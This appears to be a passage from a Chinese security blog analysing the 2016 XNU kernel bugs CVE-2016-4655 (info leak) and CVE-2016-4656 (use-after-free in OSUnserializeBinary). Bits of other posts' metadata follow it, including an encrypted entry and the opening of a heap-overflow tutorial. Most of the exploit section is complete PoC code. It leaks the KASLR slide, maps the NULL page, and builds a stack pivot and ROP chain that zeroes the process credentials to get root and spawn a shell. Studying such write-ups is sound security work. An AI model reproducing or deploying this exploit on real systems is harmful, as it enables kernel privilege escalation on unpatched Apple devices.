CVE-2016-4656-UAF漏洞UAF漏洞即当一个已经free的内存在某处被引用以后发生，可以想象，一个被free的对象其内容是不确定的，对其引用则会造成不可预测的后果。因为内存可能随时被其他对象占用，而在这里，如果我们时机足够恰当，就可以精心构造一个对象占用free的内存，当前引用时，就会按照我们的计划执行。来看下漏洞点，下面的代码是序列化字典dic将OSString这个键转化为OSSymbol，见下 if (dict) { if (sym) { ... } else { sym = OSDynamicCast(OSSymbol, o); if (!sym &amp;&amp; (str = OSDynamicCast(OSString, o))) { sym = (OSSymbol *) OSSymbol::withString(str); o-&gt;release(); o = 0; } ok = (sym != 0); } } 这里o-&gt;release()有什么问题呢?还记得objsArray吧，用来存储所有的对象，但是用setAtIndex这个宏来将所有的对象o存在里面，而宏不实现任何类型的引用计数机制，所以存储在其中的引用不会被删除。这在我们不引用其他对象的时候是没有什么问题的，但如果是一个引用对象的话，看下面kOSSerializeObject中的switchcase。 case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; 此时之前存储在之前的objsArray的OSString已经free，而 o = objsArray[len]; o-&gt;retain();由对其进行了retain引用，好的一个完美的UAF漏洞。所以我们可以构造一个字典dic，其中OSString包含一些配对的值，然后序列化一个kOSSerializeObject引用对象，OSString将调用retain，但却是一个被释放的对象。 0x04 漏洞利用-PoC分析同样分为两个漏洞利用：1，CVE-2016-4655-infoleak漏洞利用；2，CVE-2016-4656-UAF漏洞利用 CVE-2016-4655-infoleak漏洞利用infoleak漏洞利用步骤： 构造一个包含过长的OSNumberdic字典 用这个序列化字典去设置userclient对象的属性 读回设置的OSNumber属性，造成infoleak 利用读取回来的内核地址信息计算KASLR 完整的代码。 uint64_t kslide_infoleak(void) { kern_return_t kr = 0, err = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; io_service_t serv = 0; io_connect_t conn = 0; io_iterator_t iter = 0; uint64_t kslide = 0; void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // dictionary with two entries WRITE_IN(dict, (kOSSerializeSymbol | 4)); // key with symbol, 3 chars + NUL byte WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key + NUL byte in little-endian WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); // value with big-size number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); // at least 8 bytes for our big numbe host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); char buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; #if 0 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } #endif uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); return kslide; } 构造字典看下面这段代码 void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) 这里的WRITE_IN这个宏只是为了方便我们将数据填入内存之中 xml的字典格式 &lt;dict&gt; &lt;symbol&gt;AAA&lt;/symbol&gt; &lt;number size=0x200&gt;0x4141414141414141&lt;/number&gt; &lt;/dict&gt; 对应的代码 WRITE_IN(dict, (0x000000d3)); // 头部签名 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 2)); // 包含两个元素的字典 WRITE_IN(dict, (kOSSerializeSymbol | 4)); // 长度为3的symbol WRITE_IN(dict, (0x00414141)); // &#39;AAA&#39; key键 WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeNumber | 0x200)); //0x200大小的number WRITE_IN(dict, (0x41414141)); WRITE_IN(dict, (0x41414141)); //实际8字节的number 利用io_service_get_matching_services_bin测试我们的dic是否有效 host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr == KERN_SUCCESS) { printf(&quot;(+) Dictionary is valid! Spawning user client...\\n&quot;); } else return -1; 若kr == KERN_SUCCESS则我们的dic则为有效 生成UserClient设定属性我们需要一个UserClient用来和内核通信，所以使用io_service_open_extended来产生一个相关服务的UserClient，这里的服务并不重要 serv = IOServiceGetMatchingService(master, IOServiceMatching(&quot;IOHDIXController&quot;)); kr = io_service_open_extended(serv, mach_task_self(), 0, NDR_record, (io_buf_ptr_t)dict, idx, &amp;err, &amp;conn); if (kr == KERN_SUCCESS) { printf(&quot;(+) UC successfully spawned! Leaking bytes...\\n&quot;); } else return -1; 首先我们通过IOServiceGetMatchingService去从IORegistry里匹配一个特定服务，然后通过io_service_open_extended让可以设置其属性并打开一个服务即隐式产生UserClient接下来就需要读取属性，我们通过得到一个访问的句柄，所以迭代IORegistry找到刚刚创建的UserClient。 IORegistryEntryCreateIterator(serv, &quot;IOService&quot;, kIORegistryIterateRecursively, &amp;iter); io_object_t object = IOIteratorNext(iter); 先通过serv端口创建io_iterator_t，我们的UserClient在serv创建之后，所以拿到iter后迭代一次即为我们的UserClient，现在就可以读取其属性并触发info-leak。 读取属性，触发info-leakchar buf[0x200] = {0}; mach_msg_type_number_t bufCnt = 0x200; kr = io_registry_entry_get_property_bytes(object, &quot;AAA&quot;, (char *)&amp;buf, &amp;bufCnt); if (kr == KERN_SUCCESS) { printf(&quot;(+) Done! Calculating KASLR slide...\\n&quot;); } else return -1; 通过io_registry_entry_get_property_bytes我们可以获取到原始字节，存在buf中，我们打印其值 for (uint32_t k = 0; k &lt; 128; k += 8) { printf(&quot;%#llx\\n&quot;, *(uint64_t *)(buf + k)); } 对应输出： 0x4141414141414141 // 有效的number 0xffffff8033c66284 // 0xffffff8035b5d800 // 0x4 // 其他数据或返回地址 0xffffff803506d5a0 // 0xffffff8033c662b4 // 0xffffff818d2b3e30 // 0xffffff80037934bf // 函数返回地址 ... 我们需要清楚函数的调用过程，那么久知道栈中返回地址所属函数这里实际读取的代码位于is_io_registry_entry_get_property_bytes函数，即io_registry_entry_get_property_bytes调用了 is_io_registry_entry_get_property_bytes。 is_io_registry_entry_get_property_bytes源代码 /* Routine io_registry_entry_get_property */ kern_return_t is_io_registry_entry_get_property_bytes( io_object_t registry_entry, io_name_t property_name, io_struct_inband_t buf, mach_msg_type_number_t *dataCnt ) { OSObject * obj; OSData * data; OSString * str; OSBoolean * boo; OSNumber * off; UInt64 offsetBytes; unsigned int len = 0; const void * bytes = 0; IOReturn ret = kIOReturnSuccess; CHECK( IORegistryEntry, registry_entry, entry ); #if CONFIG_MACF if (0 != mac_iokit_check_get_property(kauth_cred_get(), entry, property_name)) return kIOReturnNotPermitted; #endif obj = entry-&gt;copyProperty(property_name); if( !obj) return( kIOReturnNoResources ); // One day OSData will be a common container base class // until then... if( (data = OSDynamicCast( OSData, obj ))) { len = data-&gt;getLength(); bytes = data-&gt;getBytesNoCopy(); } else if( (str = OSDynamicCast( OSString, obj ))) { len = str-&gt;getLength() + 1; bytes = str-&gt;getCStringNoCopy(); } else if( (boo = OSDynamicCast( OSBoolean, obj ))) { len = boo-&gt;isTrue() ? sizeof(&quot;Yes&quot;) : sizeof(&quot;No&quot;); bytes = boo-&gt;isTrue() ? &quot;Yes&quot; : &quot;No&quot;; } else if( (off = OSDynamicCast( OSNumber, obj ))) { /* j: reading an OSNumber */ offsetBytes = off-&gt;unsigned64BitValue(); len = off-&gt;numberOfBytes(); bytes = &amp;offsetBytes; #ifdef __BIG_ENDIAN__ bytes = (const void *) (((UInt32) bytes) + (sizeof( UInt64) - len)); #endif } else ret = kIOReturnBadArgument; if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); } } obj-&gt;release(); return( ret ); } 下面代码表示正在读取OSNumber， ... else if( (off = OSDynamicCast( OSNumber, obj ))) { offsetBytes = off-&gt;unsigned64BitValue(); /* j: the offsetBytes variable is allocated on the stack */ len = off-&gt;numberOfBytes(); /* j: this reads out our malformed length, 0x200 */ bytes = &amp;offsetBytes; /* j: bytes* ptr points to a stack variable */ ... } ... 然后 if( bytes) { if( *dataCnt &lt; len) ret = kIOReturnIPCError; else { *dataCnt = len; bcopy( bytes, buf, len ); /* j: this leaks data from the stack */ } } 执行bcopy时，从bytes里读取了错误的长度，指向堆栈变量，泄漏函数返回地址，我们只需要找到一个地址减去静态地址，那么就能计算出内核偏移值 计算内核偏移将/System/Library/Kernels/kernel拖入hopper，搜索is_io_registry_entry_get_property_bytes，如下图 然后通过Xref找到调用的下一条地址即返回地址，最后将之前偏移后的地址-静态地址就等到了内核偏移值 0xffffff80037934bf - 0xffffff80003934bf = 0x3400000 也就是下面这段代码所示： uint64_t hardcoded_ret_addr = 0xffffff80003934bf; kslide = (*(uint64_t *)(buf + (7 * sizeof(uint64_t)))) - hardcoded_ret_addr; printf(&quot;(i) KASLR slide is %#016llx\\n&quot;, kslide); 现在获取到了内核偏移值就可以利用UAF漏洞执行ROP链然后提权root。here we go！ CVE-2016-4656-UAF漏洞利用XNU的堆分配器被称为zalloc，这次我可以偷下懒了，与我之前分析得linux堆分配器相比虽然细节上可能有所不同，但基本原理都大同小异，简单的说来就是提供了不同的分配表，free后的元素会放入对应大小的链表之中，且位于最后，即如果时间合适，我们下次分配同样大小的内存就会返回刚free的内存。还不清楚的可以移步深入理解Linux堆分配器-DLMalloc这篇分析。那么下面要做的就是如何构造下一个分配的对象，这里我们用OSData因为可以使用原生的二进制数据。回忆之前的UAF漏洞，当下一次o-&gt;retain引用就会触发，这里涉及到一个C++虚拟函数表的问题，当然我之前也分析过，不清楚的可以移步详解virtual table简单说来一个对象的地址实际指向的是vtable，通过vtable就能找到对应的函数。所以我们可以构造假的vtable地址达到控制rip到自定义的地址。当然这里还有另一个技术-map NULL。为了能够有效的利用和控制，因为其他地址可能被修改，我们如果能在NULL段进行shellcode以及ROP链的部署那么就能稳定的利用。下面看我们的步骤： 制作一个二进制字典，释放OSString并重新分配OSData。 Map NULL 放置stack pivot在偏移0x20到NULL页面 将一个小的传输链0x0放置在NULL页面中（这将传递执行到主链） 触发漏洞 提升权限，生成shell 下面看完整的Poc代码： void use_after_free(void) { kern_return_t kr = 0; mach_port_t res = MACH_PORT_NULL, master = MACH_PORT_NULL; /* craft the dictionary */ printf(&quot;(i) Crafting dictionary...\\n&quot;); void *dict = calloc(1, 512); uint32_t idx = 0; // index into our data #define WRITE_IN(dict, data) do { *(uint32_t *)(dict + idx) = (data); idx += 4; } while (0) WRITE_IN(dict, (0x000000d3)); // signature, always at the beginning WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeDictionary | 6)); // dict with 6 entries WRITE_IN(dict, (kOSSerializeString | 4)); // string &#39;AAA&#39;, will get freed WRITE_IN(dict, (0x00414141)); WRITE_IN(dict, (kOSSerializeBoolean | 1)); // bool, true WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;BBB&#39; WRITE_IN(dict, (0x00424242)); WRITE_IN(dict, (kOSSerializeData | 32)); // data (0x00 * 32) WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (0x00000000)); WRITE_IN(dict, (kOSSerializeSymbol | 4)); // symbol &#39;CCC&#39; WRITE_IN(dict, (0x00434343)); WRITE_IN(dict, (kOSSerializeEndCollection | kOSSerializeObject | 1)); // ref to object 1 (OSString) /* map the NULL page */ mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; macho_map_t *map = map_file_with_path(KERNEL_PATH_ON_DISK); printf(&quot;(i) Leaking kslide...\\n&quot;); SET_KERNEL_SLIDE(kslide_infoleak()); // set global kernel slide /* set the stack pivot at 0x20 */ *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot /* build ROP chain */ printf(&quot;(i) Building ROP chain...\\n&quot;); rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); /* chain transfer, will redirect execution flow from 0x0 to our main chain above */ uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; /* trigger */ printf(&quot;(+) All done! Triggering the bug!\\n&quot;); host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; } 这里有很多的宏定义函数，先不用管这些，整个PoC代码在文章最后将会在我的GitHub上找到下面一步一步分析 构造字典将如下构造 &lt;dict&gt; &lt;string&gt;AAA&lt;/string&gt; &lt;boolean&gt;true&lt;/boolean&gt; &lt;symbol&gt;BBB&lt;/symbol&gt; &lt;data&gt; 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 &lt;/data&gt; &lt;symbol&gt;CCC&lt;/symbol&gt; &lt;reference&gt;1&lt;/reference&gt; &lt;!--引用第一个string元素--&gt; &lt;/dict&gt; 当执行retain时就会以0x20的偏移量地址读取，也就是rip其值将为0x20可能你会疑惑，0x20地址处不是应该处于__PAGEZERO段吗？是这样的，所以下面介绍Map NULL技术 Map NULL苹果并没有对32位强制限制不能map，具体我在Google上搜到了这些答案：意思就是我们可以将__PAGEZERO段重新映射为可用段，就可以将ROP链布置上去。 mach_vm_address_t null_map = 0; vm_deallocate(mach_task_self(), 0x0, PAGE_SIZE); kr = mach_vm_allocate(mach_task_self(), &amp;null_map, PAGE_SIZE, 0); if (kr != KERN_SUCCESS) return; 这段代码即禁用__PAGEZERO段和Map NULL，要达到目的，我们需要将二进制文件编译为32位，并包含pagezero_size,0标志 Pivoting stack和ROP链下面的这部分内容和我之前分析的linux ROP技术类似，利用ret指令将栈中的地址pop到rip达到执行任意代码的目的。若不清楚，移步Protostar-栈溢出学习-覆盖栈函数指针和ret指令控制eip首先将rip转移到0x20处 *(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot 然后通过交换rsp和eax值，将rip转移到0x00位置处，这一步的目的即在__PAGEZERO段上控制栈结构，因为每是将rsp的值pop到ret中，这也就是stack pivot技术。 uint64_t *transfer = (uint64_t *)0x0; transfer[0] = ROP_POP_RSP(map); transfer[1] = (uint64_t)chain-&gt;chain; 接着rip转移到main-&gt;chain，和前面一样ROP链一样，不过主链是为了达到提权的目的。主链的代码 rop_chain_t *chain = calloc(1, sizeof(rop_chain_t)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_current_proc&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_proc_ucred&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_posix_cred_get&quot;)); PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain); PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_bzero&quot;)); PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, &quot;_thread_exception_return&quot;)); 主链的执行过程其实原理并不复杂： chain prototype: proc = current_proc();//找到当前程序的credentials结构 ucred = proc_ucred(proc); posix_cred = posix_cred_get(ucred); bzero(posix_cred, (sizeof(int) * 3));//将组id设为0即提权为root thread_exception_return();//thread_exception_return只是让我们离开内核区域而不会panic，通常用于从内核陷阱返回。 接下来的代码和之前一样，测试我们构造的dic是否有效： host_get_io_master(mach_host_self(), &amp;master); // get iokit master port kr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res); if (kr != KERN_SUCCESS) return; 最后如果一切都顺利，我们检查当前进程getuid是否等于0，如果是就提权root成功，然后调用system(&quot;/bin/bash&quot;)弹出一个shell！ if (getuid() == 0) { puts(&quot;(+) got r00t!&quot;); system(&quot;/bin/bash&quot;); } 测试： 0x04 总结终于完了，如果认真的一步步分析过来，相信你一定有很多收获和感悟。谁不一样呢？当我一步步的咬着英文看了太多资料和别人的分析，当不熟悉一个领域的时候，会感到害怕，烦躁，困惑。当然在这之中，特别感谢看雪iOS安全小组的黄大大和杨君大大，给我了解答了很多困惑，很是感动。从准备分析到写完这篇文章，连续花了7天时间，庆幸自己坚持下来，学到了很多之前都不了解的技术。在分析这个漏洞及利用的时候，我才发现把之前学的linux堆栈漏洞的各个知识点都串了起来，包括-堆管理原理，ROP，UAF，Vtable等等等等。也印证了今天在微博上看到教主的那句话：学好书不求甚解，爱技术不论用处，当我去用之前所学去理解一个个知识点的时候才体会到后半句：每有会意便欣然忘食 PoC完整的Poc代码在这里 特别感谢 mrh –这是黄大大的分析，黄大大是一个特别严谨细致的人，分析文章使人豁然开朗 jndok’s blog –本文大多基于jndok的分析，可以去看看原文的分析 杨君的小黑屋–杨君大大特别有耐心，执着于技术，乐于分享技术 参考1.User Client Info.txt2.Attacking-The-XNU-Kernal-In-El-Capitain3.Mac OS X Privilege Escalation via Use-After-Free: CVE-2016-18284.Defiling-Mac-OS-X-Ruxcon5.Apple Mac OSX Kernel - Exploitable NULL Dereference in CoreCaptureResponder Due to Unchecked Return Value6.认真分析mmap：是什么 为什么 怎么用7.Resolving kernel symbols OSUnserializeBinary源码 OSObject * OSUnserializeBinary(const char *buffer, size_t bufferSize, OSString **errorString) { OSObject ** objsArray; uint32_t objsCapacity; uint32_t objsIdx; OSObject ** stackArray; uint32_t stackCapacity; uint32_t stackIdx; OSObject * result; OSObject * parent; OSDictionary * dict; OSArray * array; OSSet * set; OSDictionary * newDict; OSArray * newArray; OSSet * newSet; OSObject * o; OSSymbol * sym; size_t bufferPos; const uint32_t * next; uint32_t key, len, wordLen; bool end, newCollect, isRef; unsigned long long value; bool ok; if (errorString) *errorString = 0; if (0 != strcmp(kOSSerializeBinarySignature, buffer)) return (NULL); if (3 &amp; ((uintptr_t) buffer)) return (NULL); if (bufferSize &lt; sizeof(kOSSerializeBinarySignature)) return (NULL); bufferPos = sizeof(kOSSerializeBinarySignature); next = (typeof(next)) (((uintptr_t) buffer) + bufferPos); DEBG(&quot;---------OSUnserializeBinary(%p)\\n&quot;, buffer); objsArray = stackArray = NULL; objsIdx = objsCapacity = 0; stackIdx = stackCapacity = 0; result = 0; parent = 0; dict = 0; array = 0; set = 0; sym = 0; ok = true; while (ok) { bufferPos += sizeof(*next); if (!(ok = (bufferPos &lt;= bufferSize))) break; key = *next++; len = (key &amp; kOSSerializeDataMask); wordLen = (len + 3) &gt;&gt; 2; end = (0 != (kOSSerializeEndCollecton &amp; key)); DEBG(&quot;key 0x%08x: 0x%04x, %d\\n&quot;, key, len, end); newCollect = isRef = false; o = 0; newDict = 0; newArray = 0; newSet = 0; switch (kOSSerializeTypeMask &amp; key) { case kOSSerializeDictionary: o = newDict = OSDictionary::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeArray: o = newArray = OSArray::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeSet: o = newSet = OSSet::withCapacity(len); newCollect = (len != 0); break; case kOSSerializeObject: if (len &gt;= objsIdx) break; o = objsArray[len]; o-&gt;retain(); isRef = true; break; case kOSSerializeNumber: bufferPos += sizeof(long long); if (bufferPos &gt; bufferSize) break; value = next[1]; value &lt;&lt;= 32; value |= next[0]; o = OSNumber::withNumber(value, len); next += 2; break; case kOSSerializeSymbol: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; if (0 != ((const char *)next)[len-1]) break; o = (OSObject *) OSSymbol::withCString((const char *) next); next += wordLen; break; case kOSSerializeString: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSString::withStringOfLength((const char *) next, len); next += wordLen; break; case kOSSerializeData: bufferPos += (wordLen * sizeof(uint32_t)); if (bufferPos &gt; bufferSize) break; o = OSData::withBytes(next, len); next += wordLen; break; case kOSSerializeBoolean: o = (len ? kOSBooleanTrue : kOSBooleanFalse); break; default: break; } if (!(ok = (o != 0))) break; if (!isRef) { setAtIndex(objs, objsIdx, o); if (!ok) break; objsIdx++; } if (dict) { if (sym) { DEBG(&quot;%s = %s\\n&quot;, sym-&gt;getCStringNoCopy(), o-&gt;getMetaClass()-&gt;getClassName()); if (o != dict) ok = dict-&gt;setObject(sym, o); o-&gt;release(); sym-&gt;release(); sym = 0; } else { sym = OSDynamicCast(OSSymbol, o); ok = (sym != 0); } } else if (array) { ok = array-&gt;setObject(o); o-&gt;release(); } else if (set) { ok = set-&gt;setObject(o); o-&gt;release(); } else { assert(!parent); result = o; } if (!ok) break; if (newCollect) { if (!end) { stackIdx++; setAtIndex(stack, stackIdx, parent); if (!ok) break; } DEBG(&quot;++stack[%d] %p\\n&quot;, stackIdx, parent); parent = o; dict = newDict; array = newArray; set = newSet; end = false; } if (end) { if (!stackIdx) break; parent = stackArray[stackIdx]; DEBG(&quot;--stack[%d] %p\\n&quot;, stackIdx, parent); stackIdx--; set = 0; dict = 0; array = 0; if (!(dict = OSDynamicCast(OSDictionary, parent))) { if (!(array = OSDynamicCast(OSArray, parent))) ok = (0 != (set = OSDynamicCast(OSSet, parent))); } } } DEBG(&quot;ret %p\\n&quot;, result); if (objsCapacity) kfree(objsArray, objsCapacity * sizeof(*objsArray)); if (stackCapacity) kfree(stackArray, stackCapacity * sizeof(*stackArray)); if (!ok &amp;&amp; result) { result-&gt;release(); result = 0; } return (result); }","tags":[{"name":"Pegasus","slug":"Pegasus","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/Pegasus/"},{"name":"cve","slug":"cve","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/cve/"},{"name":"CVE-2016-4655","slug":"CVE-2016-4655","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4655/"},{"name":"CVE-2016-4656","slug":"CVE-2016-4656","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/CVE-2016-4656/"},{"name":"PoC","slug":"PoC","permalink":"https://github.com/4ch12dy/4ch12dy.github.io.git/tags/PoC/"}]},{"title":"PE格式分析","date":"2017-04-29T08:41:18.000Z","path":"2017/04/29/PE格式分析/PE格式分析/","text":"Need password to decrypt! Incorrect Password! No content to display! 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","tags":[]},{"title":"Protostar-堆溢出学习-滥用堆metadata重定向程序执行","date":"2017-04-26T13:24:19.000Z","path":"2017/04/26/Protostar-堆溢出系列学习-heap 3/Protostar-堆溢出系列学习-heap 3/","text":"0x00 序 学习最后一个堆溢出漏洞，在这之前，强烈建议先阅读下我之前对linux堆管理DLMalloc的分析这是一个滥用堆metadata导致free()函数造成任意地址写的一个漏洞利用。下面一步一步的分析 0x01 C语言源代码#include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; #include &lt;string.h&gt; #include &lt;sys/types.h&gt; 